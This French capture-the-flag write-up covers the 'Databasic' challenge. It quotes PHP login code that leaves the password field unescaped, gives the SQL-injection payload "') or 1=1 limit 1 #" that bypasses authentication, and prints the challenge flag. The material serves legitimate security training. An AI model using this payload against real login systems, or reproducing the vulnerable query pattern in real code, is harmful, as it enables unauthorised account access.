# Databasic

1. Tout d’abord, passons par le Web et affichons le code source sur le référentiel git. 
2. Ensuite, nous pouvons découvrir le code source ici : 
    ```
    $query = sprintf("SELECT * FROM haxorz_memberz WHERE login = '%s' AND password = MD5('%s')",
		mysqli_real_escape_string($con, $_POST['login']),
		$_POST['password']
	);
    ```
    [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)

    Comme vous pouvez le voir, la partie "login" est filtrée par la commande "mysqli_real_escape_string()", donc évidemment nous ne pouvons pas utiliser l’injection sql dessus. Cependant, voyons la partie "mot de passe" et nous sommes en mesure de découvrir qu’elle n’est pas filtrée. C’est clairement qu’il peut s’agir d’une injection sql.
3. Ensuite, nous devons remarquer une partie du code : 
    ```
    if (@mysqli_num_rows($sql) == 1)
		$auth = TRUE;
    ```
    [mysqli_num_rows()](https://www.w3schools.com/php/func_mysqli_num_rows.asp)

    Comme vous pouvez le constater, nous devons satisfaire la situation pour obtenir le flag. Pour atteindre l’objectif, nous devons utiliser le mot-clé "limit" pour nous aider. 
4. Voici le payload: 
    ```
    login : admin
    password : ') or 1=1 limit 1 #
    ```
    Donc la phrase veut maintenant dire : 
    ```
    SELECT * FROM haxorz_memberz WHERE login = 'admin' AND password = MD5('') or 1=1 limit 1 #')
    ```
5. **Voici le flag :** `W3C{wen_eta_mysqli_real_md5_string()?}`
